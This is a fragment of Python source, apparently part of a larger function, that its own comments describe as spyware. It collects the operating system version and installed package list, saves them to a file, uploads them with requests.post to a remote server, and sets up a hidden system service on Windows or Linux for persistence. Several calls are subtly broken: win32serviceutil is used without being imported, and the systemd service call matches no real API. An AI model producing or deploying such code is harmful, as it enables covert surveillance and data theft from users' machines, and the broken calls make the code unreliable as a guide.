    # Collect system configuration and software inventory
    system_config = platform.system() + " " + platform.release()
    software_inventory = subprocess.check_output(["dpkg", "--list"]).decode("utf-8")

    # Save collected data to output file
    with open(output_file, "w") as f:
        f.write(system_config + "\n" + software_inventory)

    # Upload data to remote server
    requests.post(remote_server, data=system_config + "\n" + software_inventory)

    # Create hidden system service
    if platform.system() == "Windows":
        import win32service
        # Create a hidden system service
        service_name = "ConfigInventoryService"
        service_description = "Spyware system configuration inventory"
        win32serviceutil.ServiceInstaller(service_name, service_name, service_description)
    elif platform.system() == "Linux":
        import systemd
        # Create a hidden system service
        service_name = "configinventory"
        systemd.Service(service_name, "Spyware system configuration inventory").start()
